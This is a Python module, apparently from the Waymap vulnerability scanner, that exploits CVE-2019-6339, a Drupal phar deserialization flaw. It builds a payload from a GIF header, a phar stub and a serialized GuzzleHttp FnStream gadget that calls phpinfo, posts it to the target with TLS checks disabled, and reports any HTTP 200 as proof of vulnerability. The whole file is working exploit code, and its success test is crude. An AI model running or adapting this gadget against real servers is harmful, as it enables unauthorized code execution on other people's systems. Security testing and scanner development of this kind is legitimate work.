# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2019-6339

import requests
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


class Color:
    IMPORTANT = '\33[35m'
    NOTICE = '\033[33m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'

color_random = [Color.IMPORTANT, Color.NOTICE, Color.OKGREEN, Color.WARNING, Color.RED, Color.END]


def scan_cve_2019_6339(target):
    vuln_url = target + "/phar.phar"

    print(color_random[2] + "\n[+] Vulnerable URL: %s\n" % vuln_url + Color.END)

    payload = (
        b"\x47\x49\x46\x38\x39\x61"  
        b"<?php __HALT_COMPILER(); ?>"
        b'O:24:"GuzzleHttp\\Psr7\\FnStream":1:{s:9:"_fn_close";s:7:"phpinfo";}'
    )

    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
        'Connection': "close",
        'Content-Type': "application/octet-stream",
        'Accept': "*/*",
        'Cache-Control': "no-cache"
    }

    try:
        response = requests.post(vuln_url, data=payload, headers=headers, proxies=proxies, verify=False)

        if response.status_code == 200:
            print(color_random[2] + "\n[+] Success! Server is vulnerable to CVE-2019-6339. `phpinfo` executed.\n" + Color.END)
            print(color_random[3] + response.text + Color.END)
        else:
            print(color_random[4] + "\n[!] No vulnerability detected. Status Code: %d\n" % response.status_code + Color.END)
    
    except requests.RequestException as e:
        print(color_random[4] + "\n[!] An error occurred while sending the request.\n" + Color.END)
        print(color_random[3] + "Error details: %s" % str(e) + Color.END)
